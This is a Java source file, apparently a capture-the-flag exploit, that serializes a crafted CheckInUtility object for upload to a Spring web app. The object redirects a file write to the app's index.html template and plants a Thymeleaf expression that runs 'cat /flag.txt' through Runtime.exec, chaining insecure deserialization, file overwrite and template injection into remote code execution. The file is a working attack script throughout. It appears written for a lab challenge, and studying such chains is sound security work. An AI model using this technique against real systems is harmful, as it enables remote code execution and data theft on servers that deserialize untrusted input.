package com.rh0x01.CheckpointbotApp;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import java.io.ObjectOutputStream;

import com.rh0x01.CheckpointbotApp.utils.CheckInUtility;

public class CheckpointBotApplication {

    public static void main(String[] args) throws Exception {

        // create exploit object just like uploading a normal file
        CheckInUtility expObject = new CheckInUtility("xxxxxx");

        // replace tempFile to path traversal to overwrite template file and serialize
        expObject.sheetFile = new File("/app/src/main/resources/templates/index.html");
        expObject.token = "<p th:text='${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"cat /flag.txt\").getInputStream()).nextLine()}'>";
        serializeToFile(expObject);

        System.out.println("Exploit file saved in serialized.object");
    }

    public static void serializeToFile(CheckInUtility file) {

        FileOutputStream outfile;
        try {
            outfile = new FileOutputStream("serialized.object");
            ObjectOutputStream outstream = new ObjectOutputStream(outfile);
            outstream.writeObject(file);
            outstream.close();
        } catch (IOException e) {
            System.out.println("Error occured when serializing object");
            e.printStackTrace();
        }
    }
}